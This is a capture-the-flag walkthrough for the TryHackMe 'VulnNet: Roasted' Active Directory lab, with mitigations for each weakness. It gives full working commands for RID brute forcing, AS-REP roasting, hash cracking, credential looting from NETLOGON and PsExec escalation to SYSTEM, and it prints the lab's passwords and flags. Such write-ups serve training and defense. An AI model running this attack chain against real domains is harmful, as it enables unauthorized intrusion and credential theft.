# VulnNet: Roasted CTF Walkthrough

**Target:** VulnNet: Roasted  
**Source:** [TryHackMe](https://tryhackme.com/room/vulnnetroasted)  
**Difficulty:** Easy  
**Target IP:** 10.112.137.148 → 10.112.151.110

> **Note on IPs:** The box was restarted partway through the engagement (the
> instance shut down while idle), so the target IP changed from
> `10.112.137.148` to `10.112.151.110`. Early enumeration uses the first IP;
> everything from the AS-REP roast onward uses the second. Both refer to the
> same host (`WIN-2BO8M1OE1M1`, domain `vulnnet-rst.local`).

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [SMB Enumeration](#smb-enumeration)
- [User Enumeration via RID Brute Force](#user-enumeration-via-rid-brute-force)
- [AS-REP Roasting](#as-rep-roasting)
- [Cracking the AS-REP Hash](#cracking-the-as-rep-hash)
- [SMB Share Loot: ResetPassword.vbs](#smb-share-loot-resetpasswordvbs)
- [Domain Admin Access (a-whitehat)](#domain-admin-access-a-whitehat)
- [User Flag](#user-flag)
- [SYSTEM via PsExec](#system-via-psexec)
- [System Flag](#system-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

VulnNet: Roasted is an easy Active Directory box on the domain controller for
`vulnnet-rst.local`. The objective is to capture the user and system flags. The
attack chain is a classic AD path: anonymous SMB access leaks the domain and
shares, RID brute forcing enumerates domain users without credentials, an
**AS-REP roast** recovers a crackable Kerberos hash for `t-skid`, and that
credential exposes a readable `NETLOGON` logon script (`ResetPassword.vbs`)
containing hard-coded domain-admin credentials for `a-whitehat`. With Domain
Admin in hand, a PsExec session yields a shell as `nt authority\system`.

**Key Skills Required:**
- Active Directory service enumeration
- Anonymous / guest SMB access and share enumeration
- RID cycling to enumerate domain users (CrackMapExec / enum4linux)
- AS-REP Roasting (Impacket `GetNPUsers`) and cracking (John)
- Looting logon scripts from `NETLOGON` (smbmap)
- Pass-the-credential to Domain Admin and SYSTEM (CrackMapExec, Evil-WinRM, PsExec)

---

## Reconnaissance

### Network Scanning

The service profile is unmistakably a Windows Domain Controller:

```bash
nmap -sV -O -Pn 10.112.137.148
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 53/tcp | domain | Simple DNS Plus |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | ldap | AD LDAP (Domain: `vulnnet-rst.local`) |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | RPC over HTTP |
| 3268/tcp | ldap | Global Catalog LDAP |
| 5985/tcp | http | WinRM (WS-Management) |

Kerberos (88), LDAP (389), and DNS (53) confirm a Domain Controller. The LDAP
banner reveals the domain `vulnnet-rst.local` — add it to `/etc/hosts`.

---

## SMB Enumeration

A null/guest session lists the available shares:

```bash
smbclient -L //vulnnet-rst.local
# Password: (blank)
```

```
Sharename                      Type    Comment
---------                      ----    -------
ADMIN$                         Disk    Remote Admin
C$                             Disk    Default share
IPC$                           IPC     Remote IPC
NETLOGON                       Disk    Logon server share
SYSVOL                         Disk    Logon server share
VulnNet-Business-Anonymous     Disk    VulnNet Business Sharing
VulnNet-Enterprise-Anonymous   Disk    VulnNet Enterprise Sharing
```

The guest account is permitted a session (confirmed via `enum4linux -u guest`),
and the two `*-Anonymous` shares are readable — useful for later, but the real
lead is that the guest session enables RID enumeration.

---

## User Enumeration via RID Brute Force

With an anonymous/guest bind, CrackMapExec cycles RIDs to enumerate every domain
user — no valid credentials required:

```bash
crackmapexec smb 10.112.137.148 -u 'a' -p '' -d vulnnet-rst.local --rid-brute \
  | grep '(SidTypeUser)'
```

```
500:  VULNNET-RST\Administrator
501:  VULNNET-RST\Guest
502:  VULNNET-RST\krbtgt
1000: VULNNET-RST\WIN-2BO8M1OE1M1$
1104: VULNNET-RST\enterprise-core-vn
1105: VULNNET-RST\a-whitehat
1109: VULNNET-RST\t-skid
1110: VULNNET-RST\j-goldenhand
1111: VULNNET-RST\j-leet
```

Collect the human user accounts into a wordlist:

```bash
# users.txt
administrator
guest
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

---

## AS-REP Roasting

Impacket's `GetNPUsers` requests Kerberos AS-REP tickets for accounts that have
"Do not require Kerberos preauthentication" set. Only `t-skid` qualifies:

```bash
python3 GetNPUsers.py 'vulnnet-rst.local'/ -usersfile users.txt \
  -dc-ip 10.112.151.110 -format hashcat
```

```
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:f326b66f...c7efb
```

> **AS-REP hash recovered for:** `t-skid`

---

## Cracking the AS-REP Hash

Save the hash and crack it with John against rockyou:

```bash
echo '$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:f326b66f...c7efb' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
```

> **Recovered credentials:** `t-skid : tj072889*`

---

## SMB Share Loot: ResetPassword.vbs

With valid credentials, re-enumerate shares for readable content. `smbmap`
recursively searches and finds a `.vbs` logon script in `NETLOGON`:

```bash
smbmap -H 10.112.151.110 -u t-skid -p 'tj072889*' -d vulnnet-rst.local -r
smbmap -H 10.112.151.110 -u t-skid -p 'tj072889*' -d vulnnet-rst.local -r -A .vbs
```

```
[+] Match found! Downloading: NETLOGON//ResetPassword.vbs
```

The script hard-codes credentials it uses to reset a user's password:

```vbscript
strUserNTName = "a-whitehat"
strPassword   = "bNdKVkjv3RR9ht"
```

> **Recovered credentials:** `a-whitehat : bNdKVkjv3RR9ht`

---

## Domain Admin Access (a-whitehat)

Validating `a-whitehat` shows it is a **Domain Admin** and local Administrator
(`Pwn3d!`):

```bash
crackmapexec smb 10.112.151.110 -u a-whitehat -p 'bNdKVkjv3RR9ht' \
  -d vulnnet-rst.local -x "whoami /all"
```

```
[+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
...
VULNNET-RST\Domain Admins ...
BUILTIN\Administrators ...
```

Open an Evil-WinRM session as `a-whitehat`:

```bash
evil-winrm -i 10.112.151.110 -u a-whitehat -p 'bNdKVkjv3RR9ht'
```

> **Foothold:** `a-whitehat` (Domain Admin)

---

## User Flag

The user flag is on the `enterprise-core-vn` desktop, readable via the WinRM
session:

```powershell
*Evil-WinRM* PS> more C:\Users\enterprise-core-vn\Desktop\user.txt
```

> **Q1 — user flag:** `THM{726b7c0baaac1455d05c827b5561f4ed}`

The Administrator's `system.txt` is not readable from the WinRM context
(`Access denied`), so a higher-privilege shell is needed.

---

## SYSTEM via PsExec

Because `a-whitehat` is a Domain/local Administrator, Impacket's PsExec creates a
service and returns an interactive shell running as `nt authority\system`:

```bash
impacket-psexec vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.112.151.110
```

```
[*] Found writable share ADMIN$
[*] Creating service rbNc on 10.112.151.110.....
C:\Windows\system32> whoami
nt authority\system
```

> **Privilege escalation:** `a-whitehat` → `nt authority\system`

---

## System Flag

With SYSTEM, the Administrator desktop is fully readable:

```cmd
C:\Windows\system32> more C:\Users\Administrator\Desktop\system.txt
```

> **Q2 — system flag:** `THM{16f45e3934293a57645f8d7bf71d8d4c}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{726b7c0baaac1455d05c827b5561f4ed}` | `C:\Users\enterprise-core-vn\Desktop\user.txt` |
| System flag | `THM{16f45e3934293a57645f8d7bf71d8d4c}` | `C:\Users\Administrator\Desktop\system.txt` |

---

## Vulnerabilities

### 1. Anonymous / Guest SMB Access (Medium)

**Description:** The domain controller permitted guest/null SMB sessions and
exposed share listings, enabling unauthenticated reconnaissance.

**Impact:** Share enumeration and the ability to RID-cycle domain users.

**Mitigation:**
- Disable the Guest account and restrict anonymous/null SMB sessions.
- Limit `RestrictAnonymous` / `RestrictRemoteSAM` and review share ACLs.

### 2. Domain User Enumeration via RID Cycling (Medium)

**Description:** With a guest bind, all domain users were enumerated by brute
forcing RIDs against the SAMR interface.

**Impact:** A complete user list that fed AS-REP roasting.

**Mitigation:**
- Harden anonymous SAMR access; monitor for RID-cycling behavior.

### 3. AS-REP Roastable Account (High)

**Description:** The `t-skid` account had Kerberos pre-authentication disabled
(`UF_DONT_REQUIRE_PREAUTH`), allowing an offline-crackable AS-REP to be
requested without credentials.

**Impact:** Recovery of `t-skid`'s password via offline cracking.

**Mitigation:**
- Require Kerberos pre-authentication on all accounts.
- Enforce strong passwords resistant to dictionary attacks.

### 4. Hard-coded Credentials in Logon Script (Critical)

**Description:** A `NETLOGON` logon script (`ResetPassword.vbs`) contained a
plaintext Domain Admin username and password (`a-whitehat`).

**Impact:** Direct compromise of a Domain Admin account.

**Mitigation:**
- Never store credentials in scripts or `NETLOGON`/`SYSVOL`.
- Use gMSA / managed secrets; tightly restrict logon-script readability.

### 5. Excessive Privilege / Credential Reuse to SYSTEM (Critical)

**Description:** The recovered Domain Admin account allowed PsExec service
creation and an `nt authority\system` shell on the DC.

**Impact:** Full domain controller and domain compromise.

**Mitigation:**
- Apply tiered administration and least privilege for admin accounts.
- Monitor service creation / PsExec-style lateral movement.

---

## Attack Chain Summary

```
Nmap scan → Domain Controller (Kerberos, LDAP, DNS, SMB, WinRM)
    ↓
smbclient -L (guest) → domain vulnnet-rst.local + shares
    ↓
crackmapexec --rid-brute → domain user list (t-skid, a-whitehat, ...)
    ↓
GetNPUsers (AS-REP roast) → t-skid hash (no preauth)
    ↓
john → t-skid : tj072889*
    ↓
smbmap -r → NETLOGON/ResetPassword.vbs → a-whitehat : bNdKVkjv3RR9ht (Domain Admin)
    ↓
evil-winrm a-whitehat → User flag: THM{726b7c0b...}
    ↓
impacket-psexec a-whitehat → nt authority\system
    ↓
System flag: THM{16f45e39...}
    ↓
Full domain compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and DC service identification |
| smbclient | Anonymous SMB share listing |
| enum4linux | Guest session checks and SID/user enumeration |
| CrackMapExec | RID brute forcing, credential validation, command execution |
| Impacket GetNPUsers | AS-REP roasting |
| John the Ripper | Cracking the AS-REP (krb5asrep) hash |
| smbmap | Recursive share search and downloading ResetPassword.vbs |
| Evil-WinRM | Domain Admin WinRM shell (user flag) |
| Impacket PsExec | SYSTEM shell on the DC (system flag) |

---

## References

- [TryHackMe — VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted)
- [Nmap](https://nmap.org/)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Impacket](https://github.com/fortra/impacket)
- [AS-REP Roasting (HackTricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [smbmap](https://github.com/ShawnDEvans/smbmap)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

---
